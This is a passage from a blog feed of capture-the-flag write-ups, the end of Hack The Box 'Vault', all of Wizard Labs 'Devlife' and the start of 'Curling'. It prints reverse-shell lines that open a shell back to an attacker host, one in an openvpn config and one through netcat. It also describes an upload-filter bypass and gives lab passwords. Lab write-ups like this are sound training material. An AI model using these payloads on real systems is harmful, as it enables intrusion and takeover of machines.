&lt;h4 id=&quot;port-987-is-open-and-the-service-is-unknown--lets-run-nmap-one-more-time-as-a-regular-scan-&quot;&gt;Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -Pn 192.168.5.2&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-53-and-4444--both-of-them-are-closed-weird--where-is-port-987-&quot;&gt;Port 53 and 4444 , both of them are closed. weird … where is port 987 ?&lt;/h4&gt;
&lt;h4 id=&quot;so-whats-happening-is--port-987-is-only-open-when-the-source-port-is-4444-when-two-hosts-communicate-with-each-other-through-a-certain-protocol--theres-a-source-port-and-a-destination-port--the-source-port-is-the-port-which-the-request-was-sent-from-and-this-port-is-randomly-generated--the-destination-port-is-the-port-where-the-request-is-sent-to--and-it-doesnt-change-so-for-example-when-communicating-through-http--the-client-sends-the-request-from-a-source-port-which-is-random--that-request-is-sent-to-the-destination-port-which-in-this-case-is-port-80&quot;&gt;So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.&lt;/h4&gt;
&lt;h4 id=&quot;to-be-able-to-access-port-987-we-have-to-make-sure-that-our-source-port-is-4444-to-do-this-we-will-use-ncat-and-make-it-listen-on-port-2222--then-the-service-running-on-that-port-will-be-another-ncat-connection-from-port-4444-to-port-987-on-19216852&quot;&gt;To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; and make it listen on port 2222 , then the service running on that port will be another &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; connection from port 4444 to port 987 on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.5.2&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-get-another-ssh-connection-to-dns--then-we-will-connect-to-port-2222-on-localhost--but-before-connecting-we-need-to-know-whats-the-service-unfortunately-nmap-cant-tell-us-because-our-connection-is-not-direct&quot;&gt;We will get another ssh connection to &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; can’t tell us because our connection is not direct.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-guessed-common-services-and-it-was-ssh-&quot;&gt;So I guessed common services and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-dave-as-the-username-and-dav3gerous567-as-the-password-same-credentials-for-dns-and-it-worked&quot;&gt;I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; as the username and &lt;code class=&quot;highlighter-rouge&quot;&gt;dav3gerous567&lt;/code&gt; as the password (same credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) and it worked.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-root-flag&quot;&gt;Decrypting root flag&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-dave-on-vault-theres-a-file-called-roottxtgpg-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt; there’s a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt.gpg&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-is-the-root-flag-but-gpg-encrypted-&quot;&gt;Which is the root flag but gpg encrypted :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-a-key-to-decrypt-the-flag--remember-the-key-we-saw-earlier-on-ubuntu--we-will-copy-the-file-to-ubuntu-to-decrypt-it--easiest-way-to-do-it-is-to-base64-encode-it-then-copy-the-base64-data-and-decode-it-on-ubuntu-but-base64-was-not-installed-on-vault-so-i-used-base32-instead-&quot;&gt;We need a key to decrypt the flag , remember the key we saw earlier on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; ? We will copy the file to &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; to decrypt it , Easiest way to do it is to &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encode it then copy the &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; data and decode it on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;. But &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; was not installed on &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;base32&lt;/code&gt; instead :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/47.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/48.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-decrypt-it-with-the-key--itscominghome-&quot;&gt;Now let’s decrypt it with the key : &lt;code class=&quot;highlighter-rouge&quot;&gt;itscominghome&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gpg -d root.txt.gpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---curling&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/curling/&quot;&gt;Hack The Box - Curling&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an openvpn config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is 10.10.10.109 I added it to /etc/hosts as vault.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC vault.htb Only two ports are open : 80 running http and 22 running ssh. As always we will check http. HTTP Initial Enumeration The main page is just displaying this message : Welcome to the Slowdaddy web interface We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe. We are proud to announce our first client: Sparklays (Sparklays.com still under construction) I ran gobuster but didn’t get anything , so I looked at the message again and noticed this line : We are proud to announce our first client: Sparklays (Sparklays.com still under construction). So I went to /sparklays and got a 403 response. So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 14:55:32 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin.php (Status: 200) /design (Status: 301) /admin.php sounds interesting. But in fact it’s useless. /admin.php : It asks for authentication , I tried test:test and got nothing. It didn’t print anything : And I also noticed that it’s sending the login data through GET parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. /design : Design gave us a 403 response , I ran gobuster one more time and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/design/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 15:03:20 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /uploads (Status: 301) So I checked /uploads : And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions php and html and got a new result : design.html /design.html : There’s a link titled Change Logo which takes us to this upload page : Bypassing Restricted File Upload I created a small php script to get a reverse shell : And named it shell.php. Tried to upload and as expected , it told us that this file type is not allowed : We need to know what are the allowed file types , We will use Zap’s fuzzer and a file extenstions wordlist I got from seclists. Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer By filtering the response body size we will notice that all the responses are 519 bytes except the response of .php5 which is 526 bytes. So it allows files with extension .php5 to be uploaded. Since the request has already been sent then the php shell is on the server now , Let’s excute it : There are two users on the box alex and dave , user flag is not on the box. On the desktop of dave there is a file called ssh which has ssh credentials : Now we can get an ssh connection as dave instead of this reverse shell as www-data dave : Dav3therav3123 : Escaping from ubuntu to DNS , openvpn reverse shell , Getting user Let’s take a look at the rest of the files on dave’s desktop : No idea what to do with that key itscominghome so we will leave it for now. The other file is Servers : We have another ip now : 192.168.122.5 , We need to scan it but unfortunately nmap is not on the box : Alternatively we will use nc to scan the first 100 ports like this : nc -zv 192.168.122.5 1-100 Port 80 is open and running http : Port 22 is open and running ssh : We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine : ssh -L 1234:192.168.122.4:80 dave@vault.htb Now we can go to http://localhost:1234 and access that http service : DNS configurator gives us a 404 response : Vpn configurator allows us to create an ovpn file and execute it : At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an ovpn file , and this article really helped. We are going to listen on the first host (ubuntu) and use the ovpn configurator to get a reverse shell on the second host (DNS) , We need to know the ip address of ubuntu on that subnet , ifconfig : ip : 192.168.122.1 Reverse shell payload : remote 192.168.122.1 dev tun nobind script-security 2 up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot; I used nobind because as you can see there’s a note saying that nobind must be used. Let’s update the file and click on Test VPN then check our listener : And we owned user ! SSH on DNS In the /home directory of dave on DNS there’s a file called ssh which has ssh credentials : So we can close that reverse shell and get an ssh connection on DNS as dave dave : dav3gerous567: But we had root on DNS , now we are dave. We want to get root again. sudo -l tells us that dave can use sudo on any command : So we can easily get root again by sudo su : Auth.log Enumeration By looking at Servers file again , which was on ubuntu We notice that there’s a host called The Vault and its ip is not there , so probably we need to get to that host , but we need its ip first. After a lot of enumeration I looked into auth.log and noticed that on the 2nd of September at 15:10:20 and 15:10:34 these commands were executed : Part of the log : Sep 2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0) Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root Sep 2 15:10:20 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:10:34 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root Commands : /usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 /usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 We have an ip (192.168.5.2) and we suspect that its the one we are looking for. I was using less to view the log so I searched for the ip to see if it was mentioned anywhere else :?192.168.5.2 , And I found it here too : Command : /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 On the same day at 15:07:51 That ip was scanned with nmap , and we notice --source-port=4444 , what’s that ? Source Port , Escaping from DNS to vault Let’s take that nmap command and run it again to see the results : Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan : nmap -Pn 192.168.5.2 Port 53 and 4444 , both of them are closed. weird … where is port 987 ? So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80. To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use ncat and make it listen on port 2222 , then the service running on that port will be another ncat connection from port 4444 to port 987 on 192.168.5.2 ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot; We will get another ssh connection to DNS , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately nmap can’t tell us because our connection is not direct. So I guessed common services and it was ssh : I tried dave as the username and dav3gerous567 as the password (same credentials for DNS) and it worked. Decrypting root flag In the /home directory of dave on vault there’s a file called root.txt.gpg : Which is the root flag but gpg encrypted : We need a key to decrypt the flag , remember the key we saw earlier on ubuntu ? We will copy the file to ubuntu to decrypt it , Easiest way to do it is to base64 encode it then copy the base64 data and decode it on ubuntu. But base64 was not installed on vault so I used base32 instead : Now let’s decrypt it with the key : itscominghome : gpg -d root.txt.gpg And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Curling</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/vault/0.png" /></entry><entry><title type="html">Wizard Labs - Devlife</title><link href="http://localhost:4000/wizard-labs/devlife/" rel="alternate" type="text/html" title="Wizard Labs - Devlife" /><published>2019-04-02T00:00:00+02:00</published><updated>2019-04-02T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/devlife</id><content type="html" xml:base="http://localhost:4000/wizard-labs/devlife/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-devlife-from-wizard-labs-which-is-their-second-box-to-retire-just-like-dummy-its-another-easy-box-difficulty--210--its-a-linux-box-and-its-ip-is-101120-so-lets-jump-right-in-&quot;&gt;Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;dummy&lt;/a&gt; it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.1.1.20&lt;/code&gt; so let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;We will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.20&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-2-ports-are-open--22-running-ssh-and-80-running-http-lets-check-http&quot;&gt;Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-the-main-page-we-get-this-about-me-message-and-nothing-else-&quot;&gt;On the main page we get this “About me” message and nothing else :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;About Me

Hello , My name is Teddy Smith , I am a Python developer since 2007 !

Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !!

Stay Tuned ...

TS

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/dev (Status: 301)
/index.html (Status: 200)
/manual (Status: 301)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;getting-user&quot;&gt;Getting user&lt;/h3&gt;
&lt;h4 id=&quot;so-i-checked-dev-and-found-this-online-python-27-interpreter-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;Online Python 2.7 Interpreter&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--now-we-can-get-a-reverse-shell-in-many-ways--i-just-imported-os-then-did-ossystemreverse-shell-payload-&quot;&gt;Great , now we can get a reverse shell in many ways , I just imported &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; then did &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system(reverse shell payload)&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stored-root-credentials--privilege-escalation&quot;&gt;Stored root Credentials , Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-tedd-there-is-a-directory-called-env--lets-check-that&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;tedd&lt;/code&gt; there is a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; , Let’s check that.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-a-python-script-called-supy--which-runs-su-root-and-uses-the-password-to-authenticate-&quot;&gt;We notice a python script called &lt;code class=&quot;highlighter-rouge&quot;&gt;su.py&lt;/code&gt; , which runs &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; and uses the password to authenticate :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-su-to-root-using-the-password-teddyxy2019-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to root using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;teddyxy2019&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;h4 id=&quot;previous-wizard-labs-write-up--wizard-labs---dummy&quot;&gt;Previous Wizard Labs Write-up : &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;Wizard Labs - Dummy&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like dummy it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is 10.1.1.20 so let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : nmap -sV -sT -sC 10.1.1.20 Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http. HTTP Initial Enumeration On the main page we get this “About me” message and nothing else : About Me Hello , My name is Teddy Smith , I am a Python developer since 2007 ! Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !! Stay Tuned ... TS I ran gobuster with /usr/share/wordlists/dirb/common.txt and got these results : /.htpasswd (Status: 403) /.htaccess (Status: 403) /.hta (Status: 403) /dev (Status: 301) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) Getting user So I checked /dev and found this Online Python 2.7 Interpreter : Great , now we can get a reverse shell in many ways , I just imported os then did os.system(reverse shell payload) : import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337') And we owned user ! Stored root Credentials , Privilege Escalation In the /home directory of tedd there is a directory called .env , Let’s check that. We notice a python script called su.py , which runs su root and uses the password to authenticate : import pexpect child = pexpect.spawn('su root') child.expect ('Password:') child.sendline('teddyxy2019') child.expect('\$') child.sendline('whoami') Now we can su to root using the password teddyxy2019 : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Wizard Labs Write-up : Wizard Labs - Dummy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/devlife/0.png" /></entry><entry><title type="html">Hack The Box - Curling</title><link href="http://localhost:4000/hack-the-box/curling/" rel="alternate" type="text/html" title="Hack The Box - Curling" /><published>2019-03-30T00:00:00+02:00</published><updated>2019-03-30T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/curling</id><content type="html" xml:base="http://localhost:4000/hack-the-box/curling/">&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-curling-retired-and-here-is-my-write-up-about-it-i-had-a-lot-of-fun-doing-this-box-as-it-was-easy-and-simple-also-it-was-straightforward--no-rabbit-holes-and-such-things-its-a-linux-box-and-its-ip-is-101010150-i-added-it-to-etchosts-as-curlinghtb-lets-jump-right-in-&quot;&gt;Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.150&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;curling.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC curling.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/curling/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-only-get-2-open-ports--80-running-http-and-22-running-ssh-lets-look-at-http&quot;&gt;We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-a-blog-titled-cewl-curling-site--and-its-joomla-at-this-point-i-would-run-joomscan-but-i-wanted-to-do-some-manual-enumeration-first--so-i-checked-the-source-of-the-page-and-at-the-end-of-the-body-i-found-this-comment-&quot;&gt;We see a blog titled “Cewl Curling site!” , and it’s &lt;a href=&quot;https://www.joomla.org/&quot;&gt;joomla&lt;/a&gt;. At this point I would run &lt;code class=&quot;highlighter-rouge&quot;&gt;joomscan&lt;/code&gt; but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-checked-secrettxt-and-found-this-base64-string-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/secret.txt&lt;/code&gt; and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; string :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;decoding-&quot;&gt;Decoding :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
